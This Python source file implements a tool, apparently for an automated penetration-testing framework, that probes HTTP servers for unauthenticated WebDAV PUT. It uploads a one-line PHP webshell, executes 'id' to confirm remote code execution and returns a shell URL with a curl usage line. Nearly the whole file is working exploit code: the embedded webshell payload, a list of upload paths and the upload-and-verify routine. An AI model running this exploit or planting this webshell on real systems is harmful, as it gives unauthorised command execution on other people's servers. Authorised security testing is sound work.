"""
TIRPAN — WebDAV Check & Exploit Tool
======================================
Tests for WebDAV misconfiguration on HTTP servers and attempts to
upload a PHP webshell if PUT is permitted without authentication.

Attack chain:
  1. OPTIONS request → check if PUT/DELETE are allowed
  2. PUT a PHP webshell to a known path
  3. Execute the webshell with a test command (id)
  4. Return shell URL and execution result
"""

from __future__ import annotations

import asyncio
import logging
import re

from tools.base_tool import BaseTool, ToolHealthStatus, ToolMetadata

logger = logging.getLogger(__name__)

_TIMEOUT = 15

# Minimal PHP webshell — one-liner
_WEBSHELL = b'<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>'

# Paths to try for webshell upload
_UPLOAD_PATHS = [
    "/tirpan_shell.php",
    "/uploads/tirpan_shell.php",
    "/webdav/tirpan_shell.php",
    "/files/tirpan_shell.php",
    "/tmp/tirpan_shell.php",
]

# Paths commonly used for WebDAV testing
_DAV_PATHS = ["/", "/webdav/", "/dav/", "/files/", "/uploads/"]


class WebDavTool(BaseTool):

    @property
    def metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="webdav_check",
            category="exploit-exec",
            description=(
                "Tests HTTP servers for WebDAV misconfiguration. "
                "If PUT is allowed without authentication, uploads a PHP webshell "
                "and verifies remote code execution. "
                "Actions:\n"
                "  check  — test if WebDAV PUT is enabled (safe, no upload)\n"
                "  exploit — upload webshell and verify RCE\n"
                "  cleanup — remove uploaded webshell"
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "Target base URL (e.g. 'http://192.168.56.101')",
                    },
                    "action": {
                        "type": "string",
                        "description": "'check' | 'exploit' | 'cleanup'",
                        "default": "check",
                    },
                    "shell_path": {
                        "type": "string",
                        "description": "Path to upload webshell (default: auto-detect writable path)",
                        "default": "",
                    },
                },
                "required": ["url"],
            },
        )

    async def execute(self, params: dict) -> dict:
        url    = params.get("url", "").rstrip("/")
        action = params.get("action", "check")

        if not url:
            return {"success": False, "output": None, "error": "url is required"}

        if action == "check":
            return await self._check_webdav(url)
        elif action == "exploit":
            shell_path = params.get("shell_path", "")
            return await self._exploit_webdav(url, shell_path)
        elif action == "cleanup":
            shell_path = params.get("shell_path", _UPLOAD_PATHS[0])
            return await self._cleanup(url, shell_path)
        return {"success": False, "output": None, "error": f"Unknown action: {action}"}

    async def _http_request(
        self, method: str, url: str, path: str,
        body: bytes = b"", headers: dict | None = None
    ) -> tuple[int, dict, bytes]:
        """Make a raw HTTP request. Returns (status_code, headers, body)."""
        # Parse URL
        m = re.match(r"https?://([^/:]+)(?::(\d+))?(.*)", url)
        if not m:
            return 0, {}, b""
        host = m.group(1)
        port = int(m.group(2) or 80)
        base = m.group(3) or ""

        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=_TIMEOUT,
            )
        except Exception as e:
            raise ConnectionError(f"Cannot connect to {host}:{port}: {e}")

        try:
            extra_headers = "\r\n".join(
                f"{k}: {v}" for k, v in (headers or {}).items()
            )
            if extra_headers:
                extra_headers += "\r\n"

            request = (
                f"{method} {base}{path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"{extra_headers}"
                f"Connection: close\r\n\r\n"
            ).encode() + body

            writer.write(request)
            await writer.drain()

            response = await asyncio.wait_for(reader.read(65536), timeout=_TIMEOUT)
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

        # Parse response
        if b"\r\n\r\n" not in response:
            return 0, {}, response

        header_part, _, resp_body = response.partition(b"\r\n\r\n")
        lines = header_part.decode(errors="replace").split("\r\n")
        status_code = 0
        resp_headers: dict[str, str] = {}

        if lines:
            m2 = re.match(r"HTTP/[\d.]+ (\d+)", lines[0])
            if m2:
                status_code = int(m2.group(1))
            for line in lines[1:]:
                if ": " in line:
                    k, _, v = line.partition(": ")
                    resp_headers[k.lower()] = v

        return status_code, resp_headers, resp_body

    async def _check_webdav(self, url: str) -> dict:
        """Send OPTIONS request to detect WebDAV support."""
        dav_found = False
        put_allowed = False
        details = []

        for path in _DAV_PATHS:
            try:
                status, headers, _ = await self._http_request("OPTIONS", url, path)
                allow = headers.get("allow", headers.get("dav", ""))
                dav   = headers.get("dav", "")

                if dav or "PUT" in allow.upper() or "PROPFIND" in allow.upper():
                    dav_found = True
                    if "PUT" in allow.upper():
                        put_allowed = True
                    details.append({
                        "path":       path,
                        "status":     status,
                        "allow":      allow,
                        "dav_header": dav,
                    })
            except Exception:
                continue

        if put_allowed:
            note = (
                "WebDAV PUT is enabled without authentication. "
                "Run action=exploit to upload a PHP webshell and gain RCE."
            )
        elif dav_found:
            note = "WebDAV is enabled but PUT may require authentication."
        else:
            note = "No WebDAV detected on this target."

        return {
            "success": put_allowed,
            "output": {
                "webdav_detected": dav_found,
                "put_allowed":     put_allowed,
                "checked_paths":   details,
                "note":            note,
            },
            "error": None,
        }

    async def _exploit_webdav(self, url: str, shell_path: str) -> dict:
        """Upload PHP webshell via PUT and verify execution."""
        paths_to_try = [shell_path] if shell_path else _UPLOAD_PATHS

        for path in paths_to_try:
            try:
                # Upload webshell
                status, _, _ = await self._http_request(
                    "PUT", url, path, body=_WEBSHELL,
                    headers={"Content-Type": "application/x-php"},
                )

                if status not in (200, 201, 204):
                    continue

                # Verify execution
                test_status, _, test_body = await self._http_request(
                    "GET", url, f"{path}?c=id"
                )

                output = test_body.decode(errors="replace").strip()
                if test_status == 200 and ("uid=" in output or "root" in output):
                    return {
                        "success": True,
                        "output": {
                            "shell_url":   f"{url}{path}",
                            "shell_path":  path,
                            "upload_code": status,
                            "test_output": output,
                            "usage":       f"curl '{url}{path}?c=<command>'",
                            "note": (
                                "PHP webshell uploaded and verified via WebDAV PUT. "
                                "RCE confirmed. Shell URL is ready to use. "
                                "Remember to clean up: action=cleanup"
                            ),
                        },
                        "error": None,
                    }
            except Exception as e:
                logger.debug("WebDAV exploit attempt failed for %s: %s", path, e)
                continue

        return {
            "success": False,
            "output": None,
            "error": (
                "WebDAV PUT requests returned success codes but shell execution failed. "
                "The server may not execute PHP, or the upload path is outside web root."
            ),
        }

    async def _cleanup(self, url: str, shell_path: str) -> dict:
        """Remove the uploaded webshell via DELETE."""
        try:
            status, _, _ = await self._http_request("DELETE", url, shell_path)
            if status in (200, 204, 404):
                return {
                    "success": True,
                    "output": {"deleted": shell_path, "status": status},
                    "error": None,
                }
            return {
                "success": False,
                "output": None,
                "error": f"DELETE returned HTTP {status}",
            }
        except Exception as e:
            return {"success": False, "output": None, "error": str(e)}

    async def health_check(self) -> ToolHealthStatus:
        return ToolHealthStatus(
            available=True,
            message="webdav_check (pure Python, no binary required)",
        )
